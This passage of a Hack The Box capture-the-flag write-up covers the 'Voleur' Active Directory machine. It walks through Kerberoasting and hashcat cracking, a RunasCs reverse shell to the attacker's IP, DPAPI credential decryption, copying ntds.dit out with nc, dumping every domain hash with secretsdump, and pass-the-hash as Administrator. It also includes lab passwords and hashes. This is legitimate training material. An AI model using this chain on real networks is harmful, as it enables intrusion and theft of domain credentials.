25cf3577ef335b0ee5f3bfb66af595222a800fee76a2a32398ff66d771c5674e8d1c6c3981807a4ff7225049653fa9188d41e17e8caeb41aa999e69d788ab8a3ea7039beb69c66bf5c9a8af5caae5f16da83ce1686eb7edc00ac84810eae9b3dafd516c394b29c405915dd607a35441ea77a7d84b30357bcde4da6d76dd404c0bd0439f66c2a9086c491246868391d06364c84112dde9ec6ca930738705aa499b2a42d97bb8b76778e44bc876799e482695213399839dd0ae58d078cfd9004e53bb2ef408fba97b365d55e8780696755e425133445b26239da0c0cebf1fb3e67653950034c6db914f37ac0f6b968ce2227a2f27e47b22e1b09d1c7b1a1542df08f29053754c15cf1ec83ee001e0f73db1a8fdf1319870641bfa3aaecd33349fdc275aa5835e9f8de8a98621b6ab0ddd46323dda675fc3694558f4a37977ea30aeafa5fd66e96c6041a110fa2ce3f1e1778d37bb70fd495683d235d512f29bf7241f48f0fe561cc633714f56f4002d4fad5fc3f953232a1bdfb4ec36a4cd9cfd8aab975aee3b0a839019233a2ab2892a28fb52a38acdef64a9b289b4f2451ecb99c1736022f3d297966298d8ea0485ee39c1913425722efdb926f17bcd3bc3a239c2aa749d91fcb69e2655e0fec9746503ab5421aa9624553e306fdd07f69f4ffbf0b52abaab4ffe27c93eedd1f487c0008e5e84cddcd26a168af0b82cbb40a9ec9d6270a0e0370029c54fad649b40ba3bc6b99623d25eb9768089a298e0fb2750820c94756c0acd30eaed207c00032202767820cf9298d6178b89ef8eb7a43025716539505fa71c73717a073882d3b
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$1c877938a69e17a618d32d0502062355$4984f13b6a1c9ef4974baea86d7918de50f1c714fe683c7a546e40e1a7ab8b7b5acd36f344a9cfdfd5fba07eb238d1fb44a4ce2a460f9660fd2531c3fa89da14c3a0b21775f22e6a68160c164e87f0d444ac886cdc8a068233418da45db58558d645e1d91e4f089712431bb05ec1d30648f5ac0eef64bea51f0bf63c36392b78d05245caf622c06e60ac2d815baf1ffc202d2cc7ff9125eb21233eb2e3fc1891c2f208dec446723a10024738b16e2628997b3c5d0058aba7d63aafd3a5282722164425f344023d4840e84e4561e012aa1fe5233023844c56d7df53e57d44a347f643c3a158db4bdbef94f333803ec7073f5e232aecbae795d8491699a0f0be6547c6ccb88ab0647b20591fca82e95f095fbaba8a6d622e92aff8ce0e22acee763a57de4c75a6be4f7f40f487ca548b35a98cfd4003fa3532df76dc36341e7e6f5dece2dd2ed69b982454190ea28ceda4d714610b8bf09fb436832d914e3227a1b7fa934d1958e19df771609412d97694a54d4263668aedaf89ef854e6c9a896a311e0a6ca377784c186f6d50ca68a04e6df476d734baf6b816d77b2b52501526a83c9b9fe04d352d198674a6c9da536d7521750cb0a58de06cda042649024117198f08cffae222cc14ab779eb771f464eb230cd9c9107fb749aac75232c1c1de0f84c593cd1a02630686607f6a6fd733dc703ec6616b669d2a44d2f6ce9d76d4928ce91d5cb118c8b856da474253c2ab598b82e8c1e6c849991e55c9325bf9a8191665e43b36f35c7f93b17aef6aeb3bceafabbff313929b8c077d4d516d9e993575745e39e266b3a2bdbe52bbb8c72ed6aad47baff02dea42d7b65b78d5ef88582d462690636de19f795aad7f2b57c8dbc9f01dc3596bffb167679578a3938ea822d28fa2bed27c3e85fd570335bb2e614a3ba46339f39a2e826e6bb98dbc827706ace5606263c3bbce714695cc833d5f51a7ab39241de840b50b88225f8b524063c74d593a84a6951e6a96bf9b8f17533dbf4a24d0e14c142e52505c0b6c3bd5b3c316030ca6612c48e8547871d4293b360e2174cffa28158ba80986e06e8bc483617e61150ef568595a05892b5864ad8229690748f36d5911d145e9580827c90681ba52d7d99ad59701efb94899ac7d8f601d7ccd8dcf4bdfb81ba9027a633fd4c76cdf1a55eb77560716e914be07ba41bead93c7767a1e64c271708a0ddba20e96e62f7fcb15cebac8a3a5878aefe2724f6ca0ab16d747780ddfe357aff9fd9f24f888692ee6eae76c527cc193aa85905be39f8924df4ebf4dded8407f85eef7c9e2762d2c1d90e07ccd0c21b767394640a04866cec4d2059036c0abbafa59fb6f0663ebf69fc44b565416943ade2c0ce0efd536de046f561b931515955ee46f695e90001c4278d8f5eef15c96c619d4ec3708d26245b6b7cade845ef93d7e540fdee52fc1aaa58eddbcadb75f44165c55
```

we get two **TGS** but we are more interested in **svc_winrm**

when cracking the TGS using hashcat , you need to take note of this :
> *$krb5tgs$23$**

This indicates it is a tgs-rep with etype of 23 ... this will help you decide which hashcat mode is needed when cracking the tgs

save the tgs to a file and run

```bash
hashcat -m 13100 winrm-tgs.txt /usr/share/wordlists/rockyou.txt
```

 svc_winrm : AFireInsidedeOzarctica980219afi

same process:
1. get tgt for svc_winrm
2. export tgt
3. login

```bash
faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
> evil-winrm -i dc.voleur.htb -r voleur.htb

Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> 
```

get the user flag at Desktop directory

### Restoring deleted user account

Next we need to restore the deleted user. 
https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd392261(v=ws.10)

We start by checking if the recycle bin is enabled 

```bash
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> Get-ADOptionalFeature -Filter 'name -like "Recycle Bin Feature"'


DistinguishedName  : CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=voleur,DC=htb
EnabledScopes      : {CN=Partitions,CN=Configuration,DC=voleur,DC=htb, CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=voleur,DC=htb}
FeatureGUID        : 766ddcd8-acd0-445e-f3b9-a7f9b6744f2a
FeatureScope       : {ForestOrConfigurationSet}
IsDisableable      : False
Name               : Recycle Bin Feature
ObjectClass        : msDS-OptionalFeature
ObjectGUID         : ba06e572-1681-46f7-84d2-e08b001f5c51
RequiredDomainMode :
RequiredForestMode : Windows2008R2Forest
```

based on the output we see the Recycle bin is enabled.

Next we list the deleted AD Objects 

```bash
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> Get-ADObject -Filter 'isDeleted -eq $True' -IncludeDeletedObjects -Property * | fl *
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> Get-ADObject -Filter 'isDeleted -eq $True' -IncludeDeletedObjects -Property * | fl *
```

No output, i execpect to see todd.wolfe here, back to the drawing board

![[Pasted_image_20250812084439.png]]

#### Lateral Movement

In bloodhound i noticed that **svc_ldap** is in the **Restore_Users** group but  not in the **Remote Management Users** group. We need to get a way to get a shell as **svc_ldap**

Am going to user RunasCs.exe

```bash
Evil-WinRM* PS C:\Users\svc_winrm\Documents> iwr 'http://10.10.16.62:8000/RunasCs.exe' -o RunasCs.exe
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> ls


    Directory: C:\Users\svc_winrm\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         8/12/2025   7:00 AM          51712 RunasCs.exe

*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn cmd.exe -r 10.10.16.62:1337
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-1255f0$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 1280 created in background.
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> 

```

And in our listener at port 1337 we get a connection 

```bash
rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.62] from (UNKNOWN) [10.10.11.76] 60257
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
voleur\svc_ldap

C:\Windows\system32>
```

Rerunning our previous command to list deleted object we get 

```bash
PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $True' -IncludeDeletedObjects 
Get-ADObject -Filter 'isDeleted -eq $True' -IncludeDeletedObjects 


Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=voleur,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 587cd8b4-6f6a-46d9-8bd4-8fb31d2e18d8

Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db

```

We can proceed to restore the user using the GUID

```bash
PS C:\Windows\system32> Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
PS C:\Windows\system32> 
```

After restoring its a good practice to check if the account is enabled or not 

```bash
PS C:\Windows\system32> Get-ADUser -Identity "todd.wolfe" -Properties Enabled | Select-Object Name, Enabled
Get-ADUser -Identity "todd.wolfe" -Properties Enabled | Select-Object Name, Enabled

Name       Enabled
----       -------
Todd Wolfe    True
```

From the file we obtained from SMB Share we had the password for todd.wolfe

> Todd.Wolfe: NightT1meP1dg3on14 

Get tgt for the account 

```bash
faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
impacket-getTGT voleur.htb/Todd.Wolfe:NightT1meP1dg3on14 -dc-ip 10.10.11.76
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Todd.Wolfe.ccache

```

Vefify the credentials

```bash
faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
netexec smb dc.voleur.htb -u 'todd.wolfe' -p 'NightT1meP1dg3on14' -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14 
```

### More Recon

Next we dump AD data for analysis using bloodhound. The reason we are doing this is because maybe out new user has more rights to query the AD and we may have more information that we didn't have before.

```bash
faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
> bloodhound-ce-python -u todd.wolfe@voleur.htb -p NightT1meP1dg3on14 -d voleur.htb -ns 10.10.11.76 -k  -c All --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: voleur.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 13 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
ERROR: Unhandled exception in computer DC.voleur.htb processing: The NETBIOS connection with the remote host timed out.
INFO: Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 986, in non_polling_read
    received = self._sock.recv(bytes_left)
    
[ SNIP ]

non_polling_read
    raise NetBIOSTimeout
impacket.nmb.NetBIOSTimeout: The NETBIOS connection with the remote host timed out.

INFO: Done in 01M 54S
INFO: Compressing output into 20250812173140_bloodhound.zip
                                                  
```

In bloodhound i found nothing interesting expect that the user is in the Second line group 

### DPAPI
[[DPAPI Exploitation]]
in smb, We have achived users. I decide to try exploiting DPAPI

#### Getting the **Master_Key** file 

```
faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
impacket-smbclient -k -no-pass voleur.htb/todd.wolfe@dc.voleur.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# ls
[-] No share selected
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 12:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 23:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 18:13:03 2025 Second-Line Support
# cd Second-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 18:13:03 2025 .
drw-rw-rw-          0  Wed Jan 29 12:10:01 2025 ..
drw-rw-rw-          0  Wed Jan 29 18:13:06 2025 Archived Users
# cd Archived Users
# ls 
drw-rw-rw-          0  Wed Jan 29 18:13:06 2025 .
drw-rw-rw-          0  Wed Jan 29 18:13:03 2025 ..
drw-rw-rw-          0  Wed Jan 29 18:13:16 2025 todd.wolfe
# cd todd.wolfe
# ls
drw-rw-rw-          0  Wed Jan 29 18:13:16 2025 .
drw-rw-rw-          0  Wed Jan 29 18:13:06 2025 ..
drw-rw-rw-          0  Wed Jan 29 18:13:06 2025 3D Objects
drw-rw-rw-          0  Wed Jan 29 18:13:09 2025 AppData
drw-rw-rw-          0  Wed Jan 29 18:13:10 2025 Contacts
drw-rw-rw-          0  Thu Jan 30 17:28:50 2025 Desktop
drw-rw-rw-          0  Wed Jan 29 18:13:10 2025 Documents
drw-rw-rw-          0  Wed Jan 29 18:13:10 2025 Downloads
drw-rw-rw-          0  Wed Jan 29 18:13:10 2025 Favorites
drw-rw-rw-          0  Wed Jan 29 18:13:10 2025 Links
drw-rw-rw-          0  Wed Jan 29 18:13:10 2025 Music
-rw-rw-rw-      65536  Wed Jan 29 18:13:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Wed Jan 29 15:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Wed Jan 29 15:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 15:53:07 2025 ntuser.ini
drw-rw-rw-          0  Wed Jan 29 18:13:10 2025 Pictures
drw-rw-rw-          0  Wed Jan 29 18:13:10 2025 Saved Games
drw-rw-rw-          0  Wed Jan 29 18:13:10 2025 Searches
drw-rw-rw-          0  Wed Jan 29 18:13:10 2025 Videos
# cd AppData\Roaming\Microsoft\Protect
# ls
drw-rw-rw-          0  Wed Jan 29 18:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 18:13:09 2025 ..
-rw-rw-rw-         24  Wed Jan 29 15:53:08 2025 CREDHIST
drw-rw-rw-          0  Wed Jan 29 18:13:09 2025 S-1-5-21-3927696377-1337352550-2781715495-1110
-rw-rw-rw-         76  Wed Jan 29 15:53:08 2025 SYNCHIST
# cd S-1-5-21-3927696377-1337352550-2781715495-1110
# ls
drw-rw-rw-          0  Wed Jan 29 18:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 18:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 16:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 15:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 15:53:08 2025 Preferred
# get 08949382-134f-4c63-b93c-ce52efc0aa88
# 

```

#### Getting the credential file 

We already know the file is located at `AppData\Roaming\Microsoft\Credentials`

```bash
# pwd
/Second-Line Support/Archived Users/todd.wolfe/AppData
# cd Roaming\Microsoft\Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 18:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 18:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 16:13:50 2025 772275FAD58525253490A9B0039791D3
# get 772275FAD58525253490A9B0039791D3
# 
```

With the `materkey blod` and the `credential blod` we can then proceed to decrypting the credential file which is done in two parts, first decrypting the master blob to get the key used to encrypt the credential blod, Then using the key we decrypt the credential blob. 

#### Decrypting the files

```bash
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password NightT1meP1dg3on14 -sid S-1-5-21-3927696377-1337352550-2781715495-1110
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
                                                                                                                       
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/Voleur]
└─$  impacket-dpapi credential -f 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

We get the credentials of `jeremy.combs` account.

### Priv ESC

From the first file we obtained from smb share, we know that:

> *Jeremy.Combs,  Third-Line Support Technician,  Remote Management Users.,  Has access to Software folder.*

As always verify the creds

```bash
 faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \           
> impacket-getTGT voleur.htb/jeremy.combs:qT3V9pLXyN7W4m -dc-ip 10.10.11.76 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in jeremy.combs.ccache

┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/Voleur]
└─$ export KRB5CCNAME=jeremy.combs.ccache           
 
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/Voleur]
└─$ faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
> netexec smb dc.voleur.htb -u jeremy.combs -p qT3V9pLXyN7W4m -k 
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m 
```

And are valid.

#### SMB recon

```bash
faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \           
impacket-smbclient -k -no-pass voleur.htb/jeremy.combs@dc.voleur.htb 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 12:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 23:09:59 2025 ..
drw-rw-rw-          0  Thu Jan 30 19:11:29 2025 Third-Line Support
# cd Third-Line Support
# ls
drw-rw-rw-          0  Thu Jan 30 19:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 12:10:01 2025 ..
-rw-rw-rw-       2602  Thu Jan 30 19:11:29 2025 id_rsa
-rw-rw-rw-        186  Thu Jan 30 19:07:35 2025 Note.txt.txt
# get Note.txt.txt
# get id_rsa

```

From the share we get a note and a `ssh private key`

```
cat Note.txt.txt 
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin  
```

#### Recon on WSL
Tried to use the `ssh private key` to login as `administrator` but that didnt work.

From the note, it points to smoething realted to backup .. from our list of users we do have a service account related to backup `svc_backup` also from our port scan we know that ssh is running on port `2222` and not the default port `22`.

```bash
ssh svc_backup@voleur.htb -i id_rsa -p 2222

svc_backup@DC:~$ whoami
svc_backup
svc_backup@DC:~$ 

```

SInce we are in Aa WSL, windows are stored in the `/mnt` directory.

![[Pasted_image_20250812115934.png]]

the folder of interest is the `Windows` folder where most of the system files are stored including `NTDS.dit` which contains all the password hashed of the Domain users and if we are lucky enough we can also get clear text files from the file.

```
svc_backup@DC:/mnt/c/Windows$ cd NTDS
svc_backup@DC:/mnt/c/Windows/NTDS$ ls -al
ls: cannot open directory '.': Permission denied
```

We dont have persimission to access the contents of the folder.

Decided to try `SAM Dumping` but we have limited permissions

```bash
svc_backup@DC:/mnt/c/Windows/System32/config$ ls -al
ls: netlogon.dnb: Permission denied
ls: netlogon.dns: Permission denied
ls: SAM: Permission denied
ls: SAM.LOG1: Permission denied
ls: SAM.LOG2: Permission denied
ls: SECURITY: Permission denied
ls: SECURITY.LOG1: Permission denied
ls: SECURITY.LOG2: Permission denied
ls: SOFTWARE: Permission denied
ls: SOFTWARE.LOG1: Permission denied
ls: SOFTWARE.LOG2: Permission denied
ls: SYSTEM: Permission denied
ls: SYSTEM.LOG1: Permission denied
ls: SYSTEM.LOG2: Permission denied
total 169068

```

Looking around the windows mont directory 
```bash
svc_backup@DC:/mnt/c/IT$ cd  'Third-Line Support'
svc_backup@DC:/mnt/c/IT/Third-Line Support$ ls
Backups  Note.txt.txt  id_rsa
svc_backup@DC:/mnt/c/IT/Third-Line Support$ cd Backups
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls
'Active Directory'   registry
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ cd 'Active Directory'
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls -al
total 24592
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 .
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 ..
-rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30  2025 ntds.dit
-rwxrwxrwx 1 svc_backup svc_backup    16384 Jan 30  2025 ntds.jfm
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ cd  ../registry
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls
SECURITY  SYSTEM
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ 

```

We have another directory `backups` that was not visible when we used `impacket` to interact with the smb shares.

So here we have the `NTDS.dit` file and `SYSTEM` and `SECURITY` hives.

##### Decrypting NTDS.dit

First let's copy the file to our machine. am going to use `nc`

on your machine run:
```bash
nc -l -p 8000 > ntds.dit

```

On target machine run:

```bash
nc -q 0 10.10.16.62 8000 < ntds.dit
```

when decrypting **NTDS.dit** (the Active Directory database containing user account info and password hashes), you **do need the SYSTEM hive**.

###### Why the SYSTEM hive is needed?

- The **SYSTEM hive** contains the **BootKey** (also called the syskey), which is used to encrypt parts of the NTDS.dit database, including the password hashes.
- To decrypt the NTDS.dit file’s contents, you need this BootKey from the SYSTEM hive.

Also used `nc` to have a copy of the `SYSTEM` hive in my system.

```bash
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up... 

```

And we get the hash for administrator

```bash
faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
impacket-getTGT voleur.htb/administrator -hashes :e656e07c56d831611b577b160b259ad2 -dc-ip 10.10.11.76
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache

┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/Voleur]
└─$ faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
evil-winrm -i dc.voleur.htb -r voleur.htb                                                            

┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/Voleur]
└─$ export KRB5CCNAME=administrator.ccache 

┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/Voleur]
└─$ faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
> evil-winrm -i dc.voleur.htb -r voleur.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc for module Reline
                                        
